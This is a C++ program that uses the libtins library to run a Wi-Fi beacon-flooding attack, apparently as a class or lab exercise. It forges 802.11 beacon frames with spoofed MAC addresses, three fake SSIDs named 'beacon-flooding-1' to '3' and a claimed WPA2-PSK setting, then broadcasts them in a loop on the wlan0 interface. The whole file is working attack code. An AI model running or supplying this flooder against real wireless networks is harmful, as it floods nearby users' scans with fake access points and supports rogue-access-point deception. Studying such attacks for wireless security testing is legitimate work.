#include <iostream>
#include <tins/tins.h>
#include <unistd.h>

using namespace Tins;
using namespace std;

void create_beacon(Dot11Beacon &beacon, char *param_ssid, int idx) {
    // Make this a broadcast frame. Note that Dot11::BROADCAST
    // is just the same as "ff:ff:ff:ff:ff:ff"
    beacon.addr1(Dot11::BROADCAST);

    // We'll set the source address to some arbitrary address
    switch (idx) {
    case 0: beacon.addr2("00:01:02:03:04:05"); break;
    case 1: beacon.addr2("06:07:08:09:10:11"); break;
    case 2: beacon.addr2("17:16:15:14:13:12"); break;
    }

    // Set the bssid, to the same one as above
    beacon.addr3(beacon.addr2());

    // Let's add an ssid option
    beacon.ssid(param_ssid);
    // Our current channel is 8
    beacon.ds_parameter_set(8);
    // This is our list of supported rates:
    beacon.supported_rates({ 1.0f, 5.5f, 11.0f });

    // Encryption: we'll say we use WPA2-psk encryption
    beacon.rsn_information(RSNInformation::wpa2_psk());

    // The beacon's ready to be sent!
}

int main() {
    char *ssid[3] = {
        "beacon-flooding-1 (KEJ)",
        "beacon-flooding-2 (KEJ)",
        "beacon-flooding-3 (KEJ)"
    };

    for (int i=0; i<1000; i++) {
        int idx;
        if (i%4 == 0) {
            idx = 0;
        } else if (i%3 == 0) {
            idx = 2;
        } else idx = 1;
        Dot11Beacon beacon;
        create_beacon(beacon, ssid[idx], idx);
        RadioTap tap;
        tap.inner_pdu(beacon);

        // if you're sending multiple packets, you might want to create
        PacketSender sender;
        sender.default_interface("wlan0");
        std::cout << sender.default_interface().name() << std::endl;
        for (int i=0; i<10; i++) {
            sender.send(tap);
            usleep(10000);
        }
    }
}

